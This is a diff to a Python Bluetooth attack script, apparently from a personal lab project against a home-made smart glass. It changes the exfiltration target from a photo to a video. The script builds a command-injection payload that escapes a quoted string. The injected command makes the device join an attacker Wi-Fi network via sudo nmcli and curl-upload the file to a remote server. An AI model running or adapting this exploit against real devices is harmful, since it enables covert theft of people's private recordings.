@@ -5,19 +5,19 @@ import time
 # 設定
 TARGET_MAC = "E4:5F:01:F2:6D:21"  # スマートグラスのMACアドレス（要変更）
 RFCOMM_CHANNEL = 1
-IMAGE_PATH = "/home/matsumoto/bt_attack/Selfmade_smartglass/Recording_app/Photos/photo_20251126-144143.jpg"  # スマートグラス内の画像パス（要変更）
+MOVIE_PATH = "/home/matsumoto/bt_attack/Selfmade_smartglass/Recording_app/Videos/video_20251125-214914.h264"  # スマートグラス内の画像パス（要変更）
 SERVER_IP = "192.168.4.1"
 SERVER_PORT = 8000
 SSID = "matsumoto_AP_danger"
 
 # ペイロード生成
-def generate_payload(image_path, server_ip, server_port, ssid):
+def generate_payload(movie_path, server_ip, server_port, ssid):
     """攻撃ペイロードの生成"""
     payload = (
         f'"; '
         f'sudo nmcli device wifi connect "{ssid}" && '
         f'sleep 7 && '
-        f'curl -s -m 10 -F "file=@{image_path}" http://{server_ip}:{server_port}/upload; '
+        f'curl -s -m 10 -F "file=@{movie_path}" http://{server_ip}:{server_port}/upload; '
         f'echo "'
     )
     return payload
@@ -104,7 +104,7 @@ def main():
             return
     
     # ペイロード生成
-    payload = generate_payload(IMAGE_PATH, SERVER_IP, SERVER_PORT, SSID)
+    payload = generate_payload(MOVIE_PATH, SERVER_IP, SERVER_PORT, SSID)
     
     # 確認プロンプト
     print("このペイロードを送信しますか? (y/n): ", end="")
